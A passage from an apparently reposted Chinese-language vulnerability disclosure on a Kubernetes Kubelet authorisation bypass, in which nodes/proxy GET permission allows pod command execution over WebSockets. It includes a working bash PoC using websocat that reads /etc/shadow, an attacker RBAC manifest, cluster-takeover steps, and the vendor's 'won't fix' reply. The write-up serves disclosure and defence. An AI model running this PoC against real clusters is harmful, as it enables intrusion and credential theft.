：Kubelet 根据初始 HTTP 方法，而非正在执行的操作进行授权决策。WebSocket 连接在初始握手时使用 HTTP GET  
，因此 Kubelet 检查的是 GET  
 动词，而不是 CREATE  
。  
  
1. 2. **命令执行端点默认归类为 proxy**  
：Kubelet 没有为 /exec  
、/run  
、/attach  
 和 /portforward  
 等命令执行端点定义特定的子资源。Kubelet 使用 nodes/proxy  
 资源对所有这类端点进行授权。单凭这一点并不构成可利用漏洞：如果动词映射是正确的，WebSocket 连接仍将需要 CREATE 权限。授权检查将会是 nodes/proxy CREATE  
，从而正确阻止仅拥有 GET 权限的用户。  
  
> **注意**  
  
仅仅修复这个缺陷只是治标不治本。即使添加一个新的 nodes/exec  
 资源，仍可能授予 nodes/exec GET  
 权限，而实际上应需要 CREATE  
 权限。  
  
  
这两个缺陷结合在一起，形成了一个授权绕过漏洞。这使得通常被授予的 nodes/proxy GET  
 权限意外地允许在集群中任意 Pod 内执行命令。  
## 六、检测与建议  
  
令我失望的是，此报告被关闭，状态为“不予修复（符合预期行为）”。这意味着 nodes/proxy GET  
 权限将继续作为通往集群管理员权限的一条路径而存在。  
  
作为集群管理员，您可以使用   
此检测脚本[12]  
 来检查集群中所有服务账户是否拥有此权限。理解您集群的威胁模型有助于判断这是否构成问题。在多租户集群或将节点视为安全边界的集群中，这更有可能成为威胁。  
  
利用此漏洞的一个前提是具备到 Kubelet API 的网络连通性。限制到 Kubelet 端口的流量将阻止此类攻击，但我尚未测试这可能对集群产生的其他影响。  
  
此次披露引发的讨论建议 Kubernetes 项目继续推进   
KEP-2862[40]  
 的实现。此功能目前并未普遍可用（Generally Available），而且大多数供应商似乎并不支持（除了一些公司，如 Datadog   
已在其 Charts 中实现了该功能[41]  
）。这是一个正确的方向，但并未从根本上解决问题。我将在下文详细讨论这一点。  
## 七、漏洞利用  
  
上述漏洞详情已足够理解如何实施利用了。从一个已攻陷且拥有 nodes/proxy GET  
 权限的 Pod 出发，攻击者可以：  
1. 1. **枚举可达节点上的所有 Pods**  
，通过 Kubelet 的 /pods  
 端点。  
  
1. 2. **在任何 Pod 中执行命令**  
，通过 WebSockets 绕过 CREATE  
 动词检查。  
  
1. 3. **以特权系统 Pods 为目标**  
，如 kube-proxy  
，以获取 root 访问权限。  
  
1. 4. **窃取服务账户令牌**  
，从而发现更多节点并在集群内横向移动。  
  
1. 5. **访问控制平面 Pods**  
，包括 etcd  
、kube-apiserver  
 和 kube-controller-manager  
。  
  
1. 6. **提取集群密钥（secrets）**或从特权容器挂载主机文件系统。  
  
最终结果是，一个看似只读的权限可能导致整个集群被攻陷。  
## 八、PoC  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/d7OsfYudM4bR8DASYvDbCZjOJkQqt4T2ze4BYMy1QlAWt2FUC7o25eTVrxD8DTL498icFOHugrIxTa8Az0sXZ2A/640?from=appmsg "null")  
  
这里有一个快速的PoC脚本供您尝试。  
```
#!/bin/bash# ColorsRED=$(tput setaf 1)BLUE=$(tput setaf 4)YELLOW=$(tput setaf 3)GREEN=$(tput setaf 2)ENDCOLOR=$(tput sgr0)TICK="[${GREEN}+${ENDCOLOR}] "TICK_MOVE="[${GREEN}~>${ENDCOLOR}] "TICK_BACKUP="[${GREEN}<~${ENDCOLOR}] "TICK_INPUT="[${YELLOW}!${ENDCOLOR}] "TICK_ERROR="[${RED}!${ENDCOLOR}] "# ConfigNODE_IP="${NODE_IP:?NODE_IP not set}"TOKEN="${TOKEN:?TOKEN not set}"NAMESPACE="${NAMESPACE:-default}"POD="${POD:-nginx}"CONTAINER="${CONTAINER:-nginx}"exec_cmd() {    local cmd="$1"    local args=""    for arg in $cmd; do        args+="&command=$arg"    done    args="${args:1}"  # strip leading &    timeout 3 websocat --insecure -E \        --header "Authorization: Bearer $TOKEN" \        --protocol v4.channel.k8s.io \        "wss://$NODE_IP:10250/exec/$NAMESPACE/$POD/$CONTAINER?output=1&error=1&$args" 2>/dev/null \        | grep -v '{"metadata":{}' \}echo ""echo "${TICK}Target: ${YELLOW}$NODE_IP:10250 ${ENDCOLOR}"echo "${TICK}Pod: ${YELLOW}$NAMESPACE/$POD${ENDCOLOR}"echo ""echo "${TICK_MOVE}Fetching hostname..."hostname=$(exec_cmd "cat /etc/hostname" | tr -d '\n\r') \echo "${TICK}Hostname: ${GREEN}$hostname${ENDCOLOR}"echo ""echo "${TICK_MOVE}Fetching identity..."identity=$(exec_cmd "id")echo "${TICK}Identity: ${GREEN}$identity${ENDCOLOR}"echo ""echo "${TICK_MOVE}Attempting to read /etc/shadow..."shadow=$(exec_cmd "cat /etc/shadow")if [[ -n "$shadow" ]]; then \    echo "${TICK}${RED}Successfully read /etc/shadow:${ENDCOLOR}"    echo "$shadow"else    echo "${TICK_ERROR}Could not read /etc/shadow"fi
```  
  
如果您想在线亲身体验，我已经   
发布了一个实验环境，可以逐步演练在其他 Pod 中执行命令的过程[13]  
。  
  
![在线演练](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4bR8DASYvDbCZjOJkQqt4T299YNVCo8IicvpBXBeRZWV83O0yGBkicyUSwKAkfVfiakZWY2F984zytPQ/640?from=appmsg "null")  
  
在线演练  
  
如果您更倾向于在本地测试，这里有一个最小的清单文件（manifest）供您开始。  
```
---apiVersion: v1kind: ServiceAccountmetadata:  name: attacker  namespace: default---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  name: nodes-proxy-readerrules:  - apiGroups: [""] \    resources: ["nodes/proxy"]    verbs: ["get"]---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  name: attacker-nodes-proxy-readersubjects:  - kind: ServiceAccount \    name: attacker    namespace: defaultroleRef:  kind: ClusterRole  name: nodes-proxy-reader  apiGroup: rbac.authorization.k8s.io---apiVersion: v1kind: Podmetadata:  name: attacker  namespace: defaultspec:  serviceAccountName: attacker  containers:    - name: attacker \      image: alpine      command: ["sleep", "infinity"]---apiVersion: v1kind: Podmetadata:  name: nginx  namespace: defaultspec:  containers:    - name: nginx \      image: nginx
```  
  
我将在未来几周内发布详细的漏洞利用方法，逐步介绍这些技术，包括工具以及如何利用此漏洞从 Pod 突破到节点。  
## 九、披露流程  
  
此漏洞于 2025 年 11 月 1 日通过 HackerOne 报告给 Kubernetes 安全团队。  
## 十、时间线  
  
<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">日期</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2025 年 11 月 1 日</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">向 Kubernetes 安全团队提交初始报告</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2025 年 11 月 14 日</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">请求状态更新</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2025 年 11 月 25 日</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">报告完成分类处理</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2025 年 12 月 14 日</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">通知团队 90 天披露时间线（2026 年 1 月 30 日）</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2026 年 1 月 7 日</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">随着披露日期临近，请求更新</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2026 年 1 月 23 日</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Kubernetes 安全团队回复：不予修复（符合预期行为）</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">2026 年 1 月 26 日</span></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">公开披露</span></section></td></tr></tbody></table>  
### 10.0 Kubernetes 安全团队回应  
> 非常抱歉延迟了这么久才回复。  
  
> 经过与 SIG-Auth 和 SIG-Node 的进一步审查，我们确认此行为**符合预期**  
，因此**不会分配 CVE**  
。我们同意 nodes/proxy  
 存在风险，但若要针对此特定路径进行限制，需要同时修改 **kubelet**  
（将 /exec  
 路径作为特例处理）和 **kube-apiserver**  
（在将整个路径映射到 nodes/proxy  
 后，对 /exec  
 路径添加二次路径检查）的授权机制，以强制进行“get”和“create”的双重授权。我们认为，实现并协调这样的双重授权逻辑是脆弱的、架构不正确的，并且可能是不完整的。  
  
> 我们仍然相信   
KEP-2862[42]  
 (**细粒度 Kubelet API 授权**  
) 才是正确的架构解决方案。我们的目标不是修改粗粒度的 nodes/proxy 授权，而是计划在预计于 2026 年 4 月发布的   
1.36[43]  
 版本中将细粒度权限升级为正式可用（GA），从而使其对于监控代理（monitoring agents）而言变得过时。一旦该功能在 GA 中稳定运行一段时间，我们就可以评估废弃旧方法的兼容性风险。  
  
> 在 KEP 中[44]  
，我们将只读端点（/configz /healthz /pods）分组，并将代码执行端点（/attach /exec /run）保留为一组，因为我们没有仅拥有其中某一个权限的合理用例（应用场景）。我们希望官方文档  
此处[45]  
的内容能使当前的安全状况更加清晰。随着即将到来的版本发布，我们将强调此功能的重要性以及使用 nodes/proxy 的隐患。  
  
> 您可以随时继续您的发布工作，如果愿意，也可以包含这段文字。我们希望您的文章能帮助我们鼓励整个生态系统迁移到 KEP-2862 提供的更安全的授权模型。  
  
> 此致，  
  
Kubernetes 安全团队  
  
  
我理解并感谢他们的回应，但在许多方面我并不认可。  
### 10.1 相同的行为在其他地方已被修复  
> “我们确认此行为符合预期”  
  
  
当 kubectl exec  
 命令默认从使用 SPDY 切换为 WebSocket 时，API server 开始使用错误的动词授权写操作，这与此处的错误完全相同，只不过针对的是 pods/exec  
 资源。Kubernetes v1.35 修复了这个  
先前报告的问题[46]  
，其方法是  
添加一个二次授权检查[36]  
，该检查明确地验证 CREATE 动词，而不考虑 HTTP 方法。  
  
讨论该修复的代码注释[47]  
明确说明这是一个意外的副作用。  
```
// Pod subresources differs on the REST verbs depending on the protocol used// SPDY uses POST that at the authz layer is translated to "create".// Websockets uses GET that is translated to "get".// Since the defaulting to websocket for kubectl in KEP-4006 this caused an// unexpected side effect and in order to keep existing policies backwards// compatible we always check that the "create" verb is allowed.// Ref: https://issues.k8s.io/133515//// 译文：// Pod 子资源所需的 REST 动词取决于使用的协议// SPDY 使用 POST，在授权层被翻译为 "create"。// Websockets 使用 GET，被翻译为 "get"。// 由于 KEP-4006 中 kubectl 默认使用 websocket，这导致了一个// 意外的副作用，为了保持现有策略的向后// 兼容性，我们总是检查是否允许 "create" 动词。// 参考：https://issues.k8s.io/133515
```  
### 10.2 授权不一致  
> “我们希望官方文档  
此处[45]  
的内容能使当前的安全状况更加清晰。”  
  
  
他们引用的文档称，“  
kubelet 使用与 apiserver 相同的请求属性方法授权 API 请求[48]  
”。然而，授权要求根据您访问 Kubelet /exec  
 端点的不同方式而不一致。将请求发送到 API Server 代理路径 $APISERVER/api/v1/nodes/$NODE_NAME/proxy/exec/...  
 与直接发送到 Kubelet API $NODE_IP:10250/exec/...  
 会导致不同的授权决策。  
  
为了演示，我们尝试使用 API Server 代理路径来运行 hostname  
 命令。请注意，我们指示 curl 将此请求作为 POST  
 发送。发送的请求将如下所示：  
```
POST /api/v1/nodes/minikube-m02/proxy/exec/default/nginx/nginx?command=hostname&stdout=true HTTP/2Host: 10.96.0.1User-Agent: curl/8.5.0Accept: */*Authorization: Bearer $TOKEN
```  
  
使用 curl 发送请求：  
```
curl -sk -X POST \  -H "Authorization: Bearer $TOKEN" \  "$APISERVER/api/v1/nodes/$NODE_NAME/proxy/exec/default/nginx/nginx?command=hostname&stdout=true"
```  
```
{  "kind": "Status",  "apiVersion": "v1",  "metadata": {},  "status": "Failure",  "message": "nodes \"minikube-m02\" is forbidden: User \"system:serviceaccount:default:attacker\" cannot create resource \"nodes/proxy\" in API group \"\" at the cluster scope",  "reason": "Forbidden",  "details": {    "name": "minikube-m02",    "kind": "nodes"  },  "code": 403
```  
  
正如预期的那样，响应是 403 Forbidden  
。API server 正确地将 POST  
 请求映射到 RBAC CREATE  
 动词，而我们没有此权限，因此检查失败。  
  
现在，我们尝试通过直接使用 WebSockets 连接到 Kubelet，在同一个 Pod 中运行 hostname  
 命令。请记住，WebSockets 在初始握手时使用 HTTP GET  
：  
```
 websocat \  --insecure \  --header "Authorization: Bearer $TOKEN" \  --protocol "v4.channel.k8s.io" \  "wss://$NODE_IP:10250/exec/default/nginx/nginx?output=1&error=1&command=hostname"
```  
```
nginx{"metadata":{},"status":"Success"}
```  
  
命令执行成功。通过直接使用 WebSockets 连接到 Kubelet，我们绕过了通过 API server 时阻止我们的授权检查。同一个操作，针对同一个底层的 Kubelet 端点（API Server 代理路径会将请求代理到 Kubelet），却产生了不同的授权结果。  
  
如果 GET  
 和 CREATE  
 都允许命令执行，那么动词的区别就毫无意义。RBAC 的价值在于区分读操作和写操作。  
### 10.3 KEP-2862 并未修复该漏洞  
> “我们仍然相信 KEP-2862（细粒度 Kubelet API 授权）才是正确的架构解决方案。我们的目标不是修改粗粒度的 nodes/proxy 授权，而是使其对于监控代理而言变得过时……我们将只读端点（/configz /healthz /pods）分组，并将代码执行端点（/attach /exec /run）保留为一组，因为我们没有仅拥有其中某一个权限的合理用例。”  
  
  
KEP-2862（Kubelet 细粒度授权）引入了特定的子资源权限，作为宽泛的 nodes/proxy  
 权限的替代方案。该 KEP 阐述了其动机：  
> “随着更多应用程序（监控和日志记录代理）转向使用 kubelet 认证端口（10250），需要允许访问某些路径，而无需授予对整个 kubelet API 的访问权限。”  
  
  
KEP-2862 提议 **添加**  
 以下权限，其假设是：如果存在 nodes/proxy  
 的替代方案，那么一开始就没人需要使用 nodes/proxy  
。  
  
<table><thead><tr><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">权限</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">授予的访问权限</span></section></th><th style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">使用场景</span></section></th></tr></thead><tbody><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">nodes/metrics</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/metrics</span></code><section><span leaf="">, </span><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/metrics/cadvisor</span></code><span leaf="">, </span><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/metrics/resource</span></code><span leaf="">, </span><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/metrics/probes</span></code></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">指标收集（Prometheus 等）</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">nodes/stats</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/stats</span></code><section><span leaf="">, </span><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/stats/summary</span></code></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">资源统计</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">nodes/log</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/logs/</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">节点日志访问</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">nodes/healthz</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/healthz</span></code><section><span leaf="">, </span><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/healthz/ping</span></code><span leaf="">, </span><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">/healthz/syncloop</span></code></section></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">健康检查</span></section></td></tr><tr><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 90%;color: rgba(255, 143, 38, 1);background: rgba(0, 0,0, .03);padding: 3px 5px;border-radius: 4px;"><span leaf="">nodes/pods</span></code></td><td style="text-align: left;line-height: 1.75;font-family: -apple-system-font,BlinkMacSystemFont, Helvetica Neue, PingFang SC, Hiragino Sans GB , Microsoft YaHei UI , Microsoft YaHei ,Arial,sans-serif;font-size: 14px;border: 1px solid #dfdfdf;padding: 0.5em 1em;color: #3f3f3f;word-break: keep-all;"><code style="text-align: left;line-height: 